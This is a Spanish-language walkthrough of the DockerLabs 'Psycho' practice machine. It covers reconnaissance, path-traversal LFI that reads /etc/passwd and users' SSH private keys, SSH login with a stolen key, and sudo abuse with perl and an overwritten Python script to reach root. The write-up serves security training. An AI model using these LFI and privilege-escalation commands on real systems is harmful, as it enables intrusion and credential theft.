---
title: "DockerLabs - Psycho"
difficulty: "Fácil"
source: "DockerLabs"
---

Psycho es una máquina específica para practicar la explotación de una vulnerabilidad LFI (Local File Inclusion) y el acceso por SSH.

## Despliegue

```bash
bash auto_deploy.sh psycho.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos:

```bash
nmap -sV -p 22,80 172.17.0.2
```

Hacemos `curl` a la página para visualizar su contenido:

```bash
curl http://172.17.0.2
```

Para ver los subdirectorios de la página, usamos `gobuster`:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50
```

Comprobamos que tiene indexados archivos como `background.jpg`, lo que sugiere que puede ser vulnerable a LFI.

## Explotación

Usamos Arjun para identificar parámetros con los que trabajar para el LFI:

```bash
arjun -u http://172.17.0.2/
```

Usando técnicas de path traversal para viajar entre directorios, comprobamos que muestra información sensible:

```bash
http://172.17.0.2/?secret=/../../../etc/passwd
```

El siguiente paso es buscar, entre los usuarios `luisillo`, `ubuntu` y `vaxei`, las claves SSH para intentar acceder:

```bash
curl -s "http://172.17.0.2/index.php?secret=/home/ubuntu/.ssh/id_rsa"
curl -s "http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa"
curl -s "http://172.17.0.2/index.php?secret=/home/luisillo/.ssh/id_rsa"
```

El único que muestra una clave es `vaxei`. La copiamos, la guardamos en un archivo y le damos los permisos correctos:

```bash
vim id_rsa_vaxei
chmod 600 id_rsa_vaxei
```

Con el fichero preparado, intentamos el acceso por SSH:

```bash
ssh -i id_rsa_vaxei -o PubkeyAcceptedAlgorithms=+ssh-rsa vaxei@172.17.0.2
```

## Escalada de privilegios

Ganamos acceso al usuario `vaxei`. El objetivo ahora es buscar movimientos laterales y escalar privilegios:

```bash
sudo -l
```

Comprobamos que `vaxei` puede ejecutar un comando como `luisillo`, por lo que intentamos abrir una terminal como ese usuario:

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

Conseguido. Ahora ejecutamos `sudo -l` de nuevo y vemos que `luisillo` puede ejecutar como root un script de Python. Revisamos la carpeta y el contenido del script:

```bash
ls -ld /opt
cat /opt/paw.py
```

Comprobamos que la carpeta tiene permisos de escritura para todos los usuarios, así que sustituimos el script por uno malicioso para obtener acceso a root:

```bash
rm -rf /opt/paw.py
echo 'import os; os.system("/bin/bash")' > /opt/paw.py
sudo /usr/bin/python3 /opt/paw.py
```

## Conclusión

Root conseguido, laboratorio finalizado con éxito.
